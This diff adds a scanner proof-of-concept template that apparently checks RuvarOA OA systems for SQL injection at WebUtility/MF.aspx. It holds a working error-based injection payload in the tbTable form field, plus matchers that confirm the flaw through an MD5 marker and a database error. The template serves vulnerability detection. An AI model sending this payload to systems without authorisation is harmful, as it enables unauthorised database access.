@@ -1,0 +1,32 @@
+id: poc-yaml-ruvaroa-mf-aspx-sqli
+info:
+  name: RuvarOA MF.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: ruvar-oa
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/WebUtility/MF.aspx'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      __VIEWSTATE=%2FwEPDwUKMTQzODQ2ODU2NGRkIOnIdBvx8FdC98ZQVziWZAsTeOJOxTvwmwGbcAdrOUw%3D&tbTable=1'+and+(select+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))>0+--+&tbPageID=1&btnMake=%E7%94%9F%E6%88%90%E8%AF%AD%E5%8F%A5&tbSql=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "ORDINAL_POSITION"
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
